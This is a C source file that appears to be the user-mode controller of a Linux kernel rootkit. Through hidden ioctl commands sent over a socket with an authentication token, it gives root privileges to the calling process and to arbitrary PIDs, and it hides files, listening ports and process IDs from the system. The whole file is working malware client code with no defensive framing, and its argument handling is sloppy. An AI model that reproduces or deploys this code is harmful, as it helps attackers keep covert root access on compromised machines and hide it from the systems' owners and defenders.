#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

#include "constants.h"


void root_me(int sockfd){
    struct s_args s_args;
    int io;

    s_args.cmd = 0;
    uid_t curr_uid =  getuid();
    printf("curr_uid : %d\n", curr_uid);

    printf("sent root cmd\n");
    io = ioctl(sockfd, AUTH_TOKEN, &s_args);

    curr_uid =  getuid();
    printf("curr_uid : %d\n", curr_uid);
}

int get_proc_uid(pid_t pid) {
    char path[MAX_BUF_SIZE];
    char pid_buffer [30];
    snprintf(pid_buffer, sizeof(pid_buffer), "%d", pid);

    snprintf(path, sizeof(path), "/proc/%s/status", pid_buffer);
    FILE *file = fopen(path, "r");
    if(file == NULL) {
        perror("Error opening file");
        return 1;
    }
    char line[MAX_BUF_SIZE];
    while(fgets(line, sizeof(line), file) != NULL) {
        if(strncmp(line, "Uid:", 4) == 0) {
            char *token = strtok(line, "\t ");
            // Skip the "Uid:" label
            token = strtok(NULL, "\t ");
            // Print the UID
            printf("pid: %s, curr_uid: %s\n", pid_buffer, token);
            return atoi(token);
        }
    }
    fclose(file);
    return 0;
}

void set_proc_root(int sockfd, pid_t pid){
    struct s_args s_args;
    int io;

    get_proc_uid(pid);

    s_args.cmd = 1;
    s_args.ptr = &pid;

    printf("sent root cmd\n");
    io = ioctl(sockfd, AUTH_TOKEN, &s_args);

    get_proc_uid(pid);
}

void hide_filename(int sockfd, char *fname) {
    struct s_args s_args;
    int io;

    char buf[MAX_BUF_SIZE];
    memset(buf, 0, sizeof(buf));

    memcpy(buf, fname, strlen(fname));

    s_args.cmd = 2;
    s_args.ptr = buf;

    io = ioctl(sockfd, AUTH_TOKEN, &s_args);
}

void hide_listening_socket(int sockfd, unsigned short portnum) {
    struct s_args s_args;
    int io;

    s_args.cmd = 3;
    s_args.ptr = &portnum;

    io = ioctl(sockfd, AUTH_TOKEN, &s_args);
}

int main ( int argc, char *argv[] )
{
    printf("[+] Start usermode dummy...\n\n");
    int sockfd;
    int io;
    sockfd = socket(AF_INET, SOCK_STREAM, 6);
    pid_t target_pid;
    char *target_pid2, *target_filename;
    unsigned short target_port;
    if (argc > 4)
        target_pid = atoi(argv[1]);
        target_port = (unsigned short)atoi(argv[2]);
        target_filename = argv[3];
        target_pid2 = argv[4];

    printf("[+] set current process with root privileges\n");
    root_me(sockfd);

    printf("[+] set PID: %d with root privileges\n", target_pid);
    set_proc_root(sockfd, target_pid);

    printf("[+] Hiding sockets listening on port %hu\n", target_port);
    hide_listening_socket(sockfd, target_port);

    printf("[+] Hiding file names \"%s\"\n", target_filename);
    hide_filename(sockfd, target_filename);

    printf("[+] Hiding PID: %s\n", target_pid2);
    hide_filename(sockfd, target_pid2);

    printf("\nbye..\n");
}
